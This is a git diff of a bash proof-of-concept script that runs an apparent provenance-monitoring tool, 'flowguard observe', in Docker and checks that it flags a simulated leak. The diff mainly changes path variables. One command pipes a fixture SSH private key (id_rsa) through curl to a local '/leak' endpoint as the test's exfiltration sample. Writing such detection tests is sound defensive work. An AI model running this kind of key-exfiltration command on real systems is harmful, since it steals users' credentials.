@@ -1,8 +1,9 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
-cd "$ROOT"
+CRATE_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+REPO_ROOT="$(cd "$CRATE_ROOT/../.." && pwd)"
+cd "$REPO_ROOT"
 
 IMAGE="${FLOWGUARD_OBSERVER_IMAGE:-flowguard-observer}"
 OUT_DIR="${FLOWGUARD_POC_OUT_DIR:-logs}"
@@ -90,13 +91,13 @@ PY
 done
 
 if [[ "${FLOWGUARD_SKIP_DOCKER_BUILD:-0}" != "1" ]]; then
-  docker build -f docker/observer.Dockerfile -t "$IMAGE" .
+  docker build -f "$CRATE_ROOT/docker/observer.Dockerfile" -t "$IMAGE" .
 fi
 
 docker_args=(
   --rm
-  -v "$ROOT:/work"
-  -v "$ROOT/fixtures/home:/home/user:ro"
+  -v "$REPO_ROOT:/work"
+  -v "$CRATE_ROOT/fixtures/home:/home/user:ro"
   -w /work
 )
 
@@ -111,7 +112,7 @@ fi
 
 set +e
 docker run "${docker_args[@]}" "$IMAGE" \
-  cargo run -- observe --json \
+  cargo run --manifest-path crates/system-provenance/Cargo.toml -- observe --json \
     --raw-strace "$RAW_STRACE" \
     -- sh -c "cat /home/user/.ssh/id_rsa | curl -sS -X POST --data-binary @- http://host.docker.internal:$PORT/leak" \
   >"$REPORT" \
@@ -126,7 +127,7 @@ if [[ "$status" -ne 1 ]]; then
   exit 1
 fi
 
-python3 scripts/dump_observe_report.py "$REPORT" --out-dir "$OUT_DIR" --name "$NAME"
+python3 "$CRATE_ROOT/scripts/dump_observe_report.py" "$REPORT" --out-dir "$OUT_DIR" --name "$NAME"
 
 python3 - "$REPORT" <<'PY'
 import json
